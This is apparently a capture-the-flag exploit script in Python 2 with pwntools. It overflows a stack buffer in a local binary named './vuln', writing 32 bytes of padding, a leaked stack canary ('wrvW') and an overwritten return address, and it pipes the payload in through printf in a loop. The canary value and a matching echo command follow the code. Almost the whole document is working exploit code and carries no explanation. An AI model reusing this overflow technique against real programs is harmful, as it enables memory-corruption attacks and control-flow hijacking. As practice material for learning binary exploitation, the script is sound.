#!/usr/bin/python
import subprocess
import pwn
for i in range(1, 256):
        b = 'a' * 32 + 'w' + 'r' + 'v' + 'W' + 'aaaa' + pwn.p32(0x000007ed, endian = 'little')
        print b
        a = subprocess.Popen(["printf", '36\n{}\n'.format(b)], stdout = subprocess.PIPE)
        b = subprocess.call(['./vuln'], stdin = a.stdout )
        print b




canary value = 'wrvW'
echo '36 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAwrvW'